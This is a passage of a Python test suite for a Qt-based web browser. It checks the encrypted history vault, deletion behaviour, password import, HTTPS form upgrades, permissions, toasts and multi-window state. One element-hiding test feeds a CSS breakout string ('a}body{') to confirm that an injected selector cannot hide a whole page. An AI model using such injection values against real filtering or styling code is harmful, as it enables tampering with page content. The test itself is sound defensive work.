H.spin(300)
check("a vault rebuilt in one window is the vault of every window",
      _same151 is True, str(_same151))
_real_he151, _real_vl151 = br.history_encrypted, br.vault_locked
br.history_encrypted = lambda: True
br.vault_locked = lambda: True
try:
    _hrow151 = (br.history[-1].get("url") if br.history else "")
    _seen151 = (len(br.visible_history()), br.bridge.getHistory(),
                len(br.history_rows()), br.history_days(),
                br.visit_info(_hrow151)["count"])
finally:
    br.history_encrypted, br.vault_locked = _real_he151, _real_vl151
    br.__dict__.pop("history_encrypted", None)
    br.__dict__.pop("vault_locked", None)
check("a sealed history shows nothing while the vault is shut",
      _seen151 == (0, "[]", 0, [], 0), str(_seen151))
_real_hk151, _real_sh151 = br.history_key, br.save_history
br.history_key = lambda: b"k" * 32
br.save_history = lambda *a, **k: None
_was_he151 = br.config.get("historyEncrypted", False)
br.config["historyEncrypted"] = False
br.config["pageIndex"] = {"https://anvils.example/": "words of a page"}
br.config["tabSnapList"] = [{"u": "https://anvils.example/"}]
try:
    _on151 = br.encrypt_history(True)
    _left151 = (dict(br.config.get("pageIndex") or {}),
                br.config.get("tabSnapList"))
finally:
    br.history_key, br.save_history = _real_hk151, _real_sh151
    br.__dict__.pop("history_key", None)
    br.__dict__.pop("save_history", None)
    br.config["historyEncrypted"] = _was_he151
    br.save_config(quiet=True)
check("sealing the history drops the page words and tab snapshots kept "
      "in the clear", _on151 is True and _left151 == ({}, None),
      str((_on151, _left151)))
_real_he151b = br.history_encrypted
br.history_encrypted = lambda: True
_snaps151 = list(br.config.get("tabSnapList") or [])
try:
    _sn151 = br.snapshot_tabs()
finally:
    br.__dict__.pop("history_encrypted", None)
check("no tab snapshots are written into the config while the history is "
      "sealed", _sn151 == 0
      and list(br.config.get("tabSnapList") or []) == _snaps151, str(_sn151))
# ===== thirteenth pass (security), part 4: deletes reach a shut vault ====
_h152 = list(br.history)
_cfg152 = br.config.get("historyEncrypted", False)
_real152 = (br.history_key, br.save_history)
try:
    br.config["historyEncrypted"] = True
    br.history_key = lambda: None
    B.HISTORY_FILE.parent.mkdir(parents=True, exist_ok=True)
    B.HISTORY_FILE.write_bytes(B.HISTORY_MAGIC + b"sealed rows")
    _aside152 = B.HISTORY_FILE.with_name(B.HISTORY_FILE.name
                                        + ".unreadable-1")
    _aside152.write_bytes(B.HISTORY_MAGIC + b"older sealed rows")
    br._history_locked = True
    br.clear_history(undoable=False)
    _files152 = (B.HISTORY_FILE.exists(), _aside152.exists())
    # a delete of single pages while the sealed file is still unread
    br._history_locked = True
    br.history = [{"url": "https://gone.example/", "t": 5}]
    br.delete_history_entries(["https://gone.example/"])
    br.forget_history_site("site.example")
    br.forget_site("fs152.example")
    br.prune_history(days=30)
    br.history_key = lambda: b"k" * 32
    br.save_history = lambda *a, **k: None
    br._read_history = lambda: [
        {"url": "https://gone.example/", "t": 1},
        {"url": "https://a.site.example/x", "t": 2},
        {"url": "https://fs152.example/a", "t": _time.time()},
        {"url": "https://old152.example/", "t": 4},
        {"url": "https://kept.example/", "t": _time.time()}]
    br.unlock_history()
    _urls152 = [e.get("url") for e in br.history]
finally:
    for _n152 in ("history_key", "save_history", "_read_history"):
        br.__dict__.pop(_n152, None)
    br.config["historyEncrypted"] = _cfg152
    br._history_locked = False
    br._history_unsaved = False
    br.history = _h152
    br.save_history()
    br.save_config(quiet=True)
check("clear history with the vault shut deletes the sealed file and the "
      "set-aside copies", _files152 == (False, False), str(_files152))
check("pages deleted while the sealed history was unread stay deleted "
      "after unlock", _urls152 == ["https://kept.example/"], str(_urls152))
import inspect as _insp152
check("clear on exit goes through the same clear",
      "self.clear_history(undoable=False)"
      in _insp152.getsource(B.Browser._clear_on_exit))
# ===== thirteenth pass, the lows Z17-Z22 =================================
_bv153 = B.PasswordVault(_Path(_tempfile.mkdtemp(
    dir=str(B.CONFIG_FILE.parent))))
_bv153.import_bitwarden(json.dumps({"items": [
    {"type": 1, "name": None,
     "login": {"username": "u153", "password": "p153",
               "uris": [{"uri": None}]}}]}))
_it153 = [i for i in _bv153.items() if i.get("username") == "u153"]
check("a Bitwarden login with null name and address is not called None",
      _it153 and "None" not in (str(_it153[0].get("host")),
                                str(_it153[0].get("title"))),
      str(_it153[:1]))


class _Page153:
    def __init__(self):
        self.ran = []

    def runJavaScript(self, js, *a):
        self.ran.append(js)


class _View153:
    def __init__(self, url):
        self._p = _Page153()
        self._u = B.QUrl(url)

    def page(self):
        return self._p

    def url(self):
        return self._u


_ht153 = br.new_tab(); H.spin(500)
H.load(_ht153, srv.url("/urltext"))
H.wait_for(lambda: "urltext" in _ht153.url().toString(), 8000)
H.js(_ht153, """(function(){var d=document.createElement('div');
  d.id='banner153';d.textContent='x';document.body.appendChild(d);
  var p=document.createElement('p');p.className='ad153';p.textContent='y';
  document.body.appendChild(p);return 1;})()""")
br._apply_hide_now(_ht153, ["p:bogus(((", "#banner153", "a}body{",
                            "p.ad153"])
H.spin(300)
_hid153 = H.js(_ht153, """[getComputedStyle(document.getElementById(
  'banner153')).display, getComputedStyle(document.querySelector(
  'p.ad153')).display, getComputedStyle(document.body).display].join()""")
_close_if_open(_ht153)
check("hiding on an open tab survives a broken selector before the good "
      "ones, and a selector cannot hide the whole page",
      _hid153 == "none,none,block", _hid153)
_rev153 = []
_real_rows153 = br.permission_rows
_real_rev153 = br.revoke_permission
br.permission_rows = lambda: [
    {"origin": "file:///", "what": "use the camera", "key": "f153"},
    {"origin": "https://other153.example", "what": "use the camera",
     "key": "o153"}]
br.revoke_permission = lambda key: _rev153.append(key)
try:
    br.stop_media_use(_View153("file:///tmp/page153.html"))
finally:
    br.__dict__.pop("permission_rows", None)
    br.__dict__.pop("revoke_permission", None)
check("stopping the camera on a file: page takes its grant back",
      _rev153 == ["f153"], str(_rev153))
br._show_plain_toast("plain line 153")
_t153 = br._toast
br._toast_result("Updated! Restart the browser to finish.")
_after153 = (br._toast is _t153, br._toast_label.text(),
             br._toast_timer.isActive())
br._hide_toast()
check("a silent update's answer does not land on another toast",
      _after153 == (True, "plain line 153", True), str(_after153))
br._show_toast()
br._toast_result("Updated to abc153")
_upd153 = br._toast_label.text() if br._toast else ""
br._hide_toast()
check("...while the update offer still shows its answer",
      _upd153 == "Updated to abc153", _upd153)
check("a file: address is a page the start setting accepts",
      B.Browser.resolve_page_url("file:///tmp/start153.html")
      == "file:///tmp/start153.html"
      and B.Browser.resolve_page_url("file://") == "",
      B.Browser.resolve_page_url("file:///tmp/start153.html"))


class _Info153:
    def __init__(self, url):
        self.u = B.QUrl(url)
        self.to = None

    def requestUrl(self):
        return self.u

    def resourceType(self):
        return _MainKind153()

    def requestMethod(self):
        return b"POST"

    def redirect(self, url):
        self.to = url.toString()

    def block(self, on):
        self.to = "blocked"

    def setHttpHeader(self, *a):
        pass

    def firstPartyUrl(self):
        return self.u


class _MainKind153:
    name = "ResourceTypeMainFrame"
    value = 0


_ok153 = br.upgrade_on_the_wire(B.QUrl("http://form153.example/send#top"))
_inf153 = _Info153("http://form153.example/send")
br.request_watch()._work(_inf153)
_again153 = _Info153("http://form153.example/send")
br.request_watch()._work(_again153)
check("https only sends a form on to https from the interceptor (body kept)",
      _ok153 is True and _inf153.to == "https://form153.example/send"
      and _again153.to is None, str((_ok153, _inf153.to, _again153.to)))
br.add_to_dictionary("zorbleflux153")
_sp153 = br.profile.persistentStoragePath()
try:
    _cd153 = (B.Path(_sp153) / "Custom Dictionary.txt").read_text(
        encoding="utf-8") if _sp153 else ""
except OSError:
    _cd153 = ""
_body153, _, _sum153 = _cd153.partition("checksum_v1 = ")
check("a word added to the dictionary is in the engine's own custom "
      "dictionary, with Chromium's checksum",
      "zorbleflux153" in _body153.splitlines()
      and _sum153 == __import__("hashlib").md5(
          _body153.encode("utf-8")).hexdigest(), _cd153[-120:])
if B.mpris is not None and getattr(B.mpris, "HAVE_DBUS", False):
    _ms153 = B.mpris.Service(None)
    _ms153.update(True, "Song153", "Band153")
    _bm153 = _ms153.bus_metadata()
    # typed D-Bus values (the 'o' and 'as' they make on the bus were
    # measured on a private session bus: scratchpad/v8); the plain list
    # stays for the status and the tests
    _ok_md153 = (type(_bm153.get("mpris:trackid")).__name__,
                 type(_bm153.get("xesam:artist")).__name__,
                 _ms153.metadata.get("xesam:artist"))
    check("MPRIS sends the track id as an object path and the artists as "
          "a string list", _ok_md153 == ("QDBusObjectPath", "QDBusArgument",
                                         ["Band153"]), str(_ok_md153))
# ===== X1b: one history, one bookmark list, one download list ==========
_h157 = list(br.history)
_w157 = br.new_window(); H.spin(700)
br.history[:] = [{"url": "https://keep157.example/", "t": 1, "title": "k"},
                 {"url": "https://gone157.example/", "t": 2, "title": "g"}]
_w157.delete_history_entries(["https://gone157.example/"])
_gone157 = [e.get("url") for e in br.history]
_w157.bookmarks = list(_w157.bookmarks)
_w157.downloads = list(_w157.downloads)
_same157 = (_w157.history is br.history, _w157.bookmarks is br.bookmarks,
            _w157.downloads is br.downloads)
try:
    _w157._closing_anyway = True
    _w157.close()
except RuntimeError:
    pass
H.spin(300)
br.history = _h157
br.save_history()
check("a history row deleted in a second window is gone from every window",
      _gone157 == ["https://keep157.example/"], str(_gone157))
check("...and the windows still share one history, bookmark and download "
      "list after a change", _same157 == (True, True, True), str(_same157))
_w2_157 = br.new_window(); H.spin(700)
_was157 = getattr(br, "_history_locked", False)
_w2_157._history_locked = True
_lk157 = getattr(br, "_history_locked", False)
br._history_locked = _was157
try:
    _w2_157._closing_anyway = True
    _w2_157.close()
except RuntimeError:
    pass
H.spin(300)
check("whether the sealed history is still unread is one answer for every "
      "window", _lk157 is True, str(_lk157))
check("the suite's own window stayed on the open-window list",
      br in B.WINDOWS)

bad = [n for ok, n in RESULTS if not ok]
print("%d checks, %d failed" % (len(RESULTS), len(bad)))
for n in bad:
    print("  FAILED:", n)
sys.stdout.flush()
H.os._exit(1 if bad else 0) if hasattr(H, "os") else sys.exit(1 if bad else 0)
